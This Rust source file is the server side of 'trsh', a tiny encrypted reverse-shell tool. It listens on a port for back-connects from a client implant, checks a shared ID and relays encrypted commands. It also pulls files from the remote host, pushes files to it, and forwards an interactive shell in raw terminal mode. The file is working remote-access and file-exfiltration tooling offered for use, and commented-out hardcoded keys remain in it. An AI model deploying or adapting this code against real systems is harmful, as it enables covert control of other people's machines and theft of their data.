// Copyright (c) 2021 asisdrico <asisdrico@outlook.com>
//
// Licensed under the MIT license
// <LICENSE or http://opensource.org/licenses/MIT>, at your
// option. This file may not be copied, modified, or distributed
// except according to those terms.

//! trsh server is the server component of the tiny rust shell
//! when started without options the server listens to the 
//! default server_addr.
//! 
//! the follwing option are avalaible:
//! -s <ip:port> - listens on ip / port and wait for backconnects 
//! 
//! the following commands are available:
//! 
//! <command> - executes the command an returns the result (default is "w")
//! 
//! get <source file> <target dir> - transfer a file from the client to the server 
//! put <source file> <target dir> - transfer a file from the server to the client
//! 
//! shell <-r> - start an interactive shell on the client an forward it to server, when 
//!              started with <-r> the shell is set to raw mode
//!  
//! the keys for encryption are set in build.rs 
use io::BufReader;
use std::io;
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::os::unix::io::RawFd;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::path;
use std::process::exit;
use std::{
    fs::File,
    io::prelude::*,
    sync::mpsc::{self, Receiver, Sender},
};

use clap::{App, Arg, SubCommand};
use terminal_size::{terminal_size, Height, Width};
use termios::*;

use cryptolib::cryptolib_salsa::Crypto;

// AES const KEY: &'static [u8; 16] = b"Fahm9Oruet8zahco";
// AES const IV: &'static [u8; 16] = b"biTh0eoYbiTh0eoY";
//const KEY: &'static [u8; 32] = b"Fahm9Oruet8zahcoFahm9Oruet8zahco";
//const IV: &'static [u8; 8] = b"biTh0eoY";
//const ID: &'static str = "ohpie2naiwoo1lah6aeteexi5beiRas7";
const ID: &'static str = env!("TRSH_ID");

const KEY: &'static [u8] = env!("TRSH_KEY").as_bytes();
const IV: &'static [u8] = env!("TRSH_IV").as_bytes();

/// starting point of the server
fn main() {
    let flags = App::new("Server")
        .version("1.0")
        .author("asisdrico <asisdrico@outlook.com>")
        .about("tiny rust shell server")
        .arg(
            Arg::with_name("server_addr")
                .long("server_addr")
                .short("s")
                .value_name("ADDRESS")
                .help("Sets the server address to listen to.")
                .required(false)
                .default_value("127.0.0.1:4444")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("redirect_stderr")
                .long("redirect_stderr")
                .short("r")
                .value_name("REDIRECT")
                .help("redirects stderr")
                .required(false)
                .takes_value(false),
        )
        .arg(
            Arg::with_name("COMMAND")
                .help("command to execute")
                .required(false)
                .default_value("w")
                .takes_value(true)
                .index(1),
        )
        .subcommand(
            SubCommand::with_name("get")
                .help("get a file")
                .arg(
                    Arg::with_name("SOURCE_FILE")
                        .required(true)
                        .takes_value(true)
                        .index(1),
                )
                .arg(
                    Arg::with_name("TARGET_DIR")
                        .required(true)
                        .takes_value(true)
                        .index(2),
                ),
        )
        .subcommand(
            SubCommand::with_name("put")
                .help("put a file")
                .arg(
                    Arg::with_name("SOURCE_FILE")
                        .required(true)
                        .takes_value(true)
                        .index(1),
                )
                .arg(
                    Arg::with_name("TARGET_DIR")
                        .required(true)
                        .takes_value(true)
                        .index(2),
                ),
        )
        .subcommand(
            SubCommand::with_name("shell").help("allocate shell").arg(
                Arg::with_name("raw_mode")
                    .long("raw")
                    .short("r")
                    .value_name("RAW")
                    .help("sets terminal into raw mode")
                    .required(false)
                    .takes_value(false),
            ),
        )
        .get_matches();

    let server_addr = flags.value_of("server_addr").unwrap();
    let server_addr = server_addr
        .parse::<SocketAddr>()
        .unwrap_or_else(|e| panic!(r#"--server_addr value "{}" invalid: {}"#, server_addr, e));

    let listener = TcpListener::bind(server_addr).unwrap();

    let (stream, addr) = listener.accept().expect("no connection");
    println!("Connection from {}", addr);
    drop(listener);
    handle_connection(stream, flags);
}

fn handle_connection(mut stream: TcpStream, flags: clap::ArgMatches) {
    let command = flags.value_of("COMMAND").unwrap();
    let redirect: &str = " 2>&1";
    let mut scommand;
    if flags.is_present("redirect_stderr") {
        scommand = format!("{}{}", command, redirect);
    } else {
        scommand = format!("{}", command);
    }

    if let Some(flags) = flags.subcommand_matches("get") {
        if flags.is_present("SOURCE_FILE") && flags.is_present("TARGET_DIR") {
            println!(
                "GET --> {} to {}",
                flags.value_of("SOURCE_FILE").unwrap(),
                flags.value_of("TARGET_DIR").unwrap()
            );
            scommand = format!("{}|{}", "GET", flags.value_of("SOURCE_FILE").unwrap());
            send_remote_command(&mut stream, &mut scommand);
            handle_get_command(
                stream,
                flags.value_of("SOURCE_FILE").unwrap(),
                flags.value_of("TARGET_DIR").unwrap(),
            );
        }
    } else if let Some(flags) = flags.subcommand_matches("put") {
        if flags.is_present("SOURCE_FILE") && flags.is_present("TARGET_DIR") {
            println!(
                "PUT --> {} to {}",
                flags.value_of("SOURCE_FILE").unwrap(),
                flags.value_of("TARGET_DIR").unwrap()
            );
            let source_file = path::Path::new(flags.value_of("SOURCE_FILE").unwrap());
            let filename = source_file.file_name().unwrap();
            scommand = format!(
                "{}|{}|{}",
                "PUT",
                filename.to_str().unwrap(),
                flags.value_of("TARGET_DIR").unwrap()
            );
            send_remote_command(&mut stream, &mut scommand);
            handle_put_command(
                stream,
                flags.value_of("SOURCE_FILE").unwrap(),
                flags.value_of("TARGET_DIR").unwrap(),
            );
        }
    } else if let Some(flags) = flags.subcommand_matches("shell") {
        if let Some((Width(w), Height(h))) = terminal_size() {
            scommand = format!("{}|{}|{}", "SHELL", w, h);
        } else {
            scommand = format!("{}|{}|{}", "SHELL", 80, 20);
        }
        send_remote_command(&mut stream, &mut scommand);
        if flags.is_present("raw_mode") {
            run_shell(stream, true);
        } else {
            run_shell(stream, false)
        }
    } else {
        send_remote_command(&mut stream, &mut scommand);
        handle_os_command(stream);
    }
}

fn send_remote_command(mut stream: &TcpStream, command: &str) {
    let mut cr = Crypto::new(KEY, IV).unwrap();
    let mut buffer = [0; 1024];

    let bytes_read = stream.read(&mut buffer).unwrap();
    cr.read(&mut buffer[..bytes_read]).unwrap();

    let remote_id = String::from_utf8_lossy(&cr.buffer()[..bytes_read]);

    println!("Remote ID: {}", remote_id);

    if remote_id != ID {
        println!("ID not valid remote[{}] <--> [{}]", remote_id, ID);
        exit(1);
    }

    cr.write(command.as_bytes()).unwrap();

    println!("Len CR Buffer {}", cr.buffer().len());
    stream.write(cr.buffer()).unwrap();
    stream.flush().unwrap();
}

fn handle_os_command(mut stream: TcpStream) {
    let mut cr = Crypto::new(KEY, IV).unwrap();
    let stdout = io::stdout();
    let mut handle = stdout.lock();
    cr.copy(&mut stream, &mut handle).unwrap();
}

fn handle_get_command(mut stream: TcpStream, source_file: &str, target_dir: &str) {
    println!("GET {}", source_file);
    let source_path = path::Path::new(source_file);
    let filename = source_path.file_name().unwrap();
    let target_path = path::Path::new(target_dir).join(filename);

    let mut cr = Crypto::new(KEY, IV).unwrap();
    let mut output = match File::create(target_path) {
        Ok(output) => output,
        Err(e) => {
            println!("could not create file: {}", e);
            return;
        }
    };
    //let (tx, rx) = channel();
    let (tx, rx): (Sender<u64>, Receiver<u64>) = mpsc::channel();

    let mut counter = 0;
    ::std::thread::spawn(move || loop {
        counter = match rx.recv() {
            Ok(counter) => counter,
            Err(_e) => {
                break;
            }
        };
        if counter == 0 {
            break;
        }
        println!("Transferred: {}\r", counter);
    });

    match cr.copy_buf(&mut stream, &mut output, &tx) {
        Ok(cnt) => println!("{} bytes were transferred", cnt),
        Err(e) => {
            println!("error copying data: {}", e);
            return;
        }
    };
    tx.send(0).unwrap();
    drop(output);
}

fn handle_put_command(mut stream: TcpStream, source_file: &str, target_dir: &str) {
    println!("PUT {} to {}", source_file, target_dir);
    let mut cr = Crypto::new(KEY, IV).unwrap();
    let input = match File::open(source_file) {
        Ok(input) => input,
        Err(e) => {
            println!("could not open source file: {}", e);
            return;
        }
    };
    let mut bufreader = BufReader::new(input);
    let (tx, rx): (Sender<u64>, Receiver<u64>) = mpsc::channel();
    let mut counter = 0;
    ::std::thread::spawn(move || loop {
        counter = match rx.recv() {
            Ok(counter) => counter,
            Err(_e) => {
                break;
            }
        };
        if counter == 0 {
            break;
        }
        println!("Transferred: {}\r", counter);
    });
    match cr.copy_buf(&mut bufreader, &mut stream, &tx) {
        Ok(cnt) => println!("{} bytes were transferred", cnt),
        Err(e) => {
            println!("error copying data: {}", e);
            return;
        }
    };
    tx.send(0).unwrap();
    drop(bufreader);
}

fn run_shell(mut s: TcpStream, raw: bool) {
    let l_stdin = io::stdin().as_raw_fd();
    let mut sane_termios: Termios = Termios::from_fd(l_stdin).unwrap();
    if raw {
        sane_termios = setup_raw(l_stdin).unwrap();
    }
    let mut f_stdin = unsafe { File::from_raw_fd(l_stdin) };
    let mut f_stdout = unsafe { File::from_raw_fd(io::stdout().as_raw_fd()) };

    println!("created local fds");

    let mut in_stream = s.try_clone().unwrap();
    ::std::thread::spawn(move || copyio(&mut f_stdin, &mut in_stream));
    let child = ::std::thread::spawn(move || copyio(&mut s, &mut f_stdout));

    let _res = child.join();
    if raw {
        setup_sane(l_stdin, &sane_termios).unwrap();
    }
}

fn copyio(rin: &mut dyn Read, rout: &mut dyn Write) {
    let mut cr = Crypto::new(KEY, IV).unwrap();

    let _br = &match cr.copy(rin, rout) {
        Ok(b) => b,
        Err(e) => {
            println!("Error copy: {}", e);
            return;
        }
    };
}

fn setup_raw(fd: RawFd) -> io::Result<termios::Termios> {
    let mut termios = Termios::from_fd(fd)?;

    let stermios = termios;

    cfmakeraw(&mut termios);
    tcsetattr(fd, TCSANOW, &mut termios)?;

    Ok(stermios)
}

fn setup_sane(fd: RawFd, &termios: &termios::Termios) -> io::Result<()> {
    tcsetattr(fd, TCSANOW, &termios)?;

    Ok(())
}
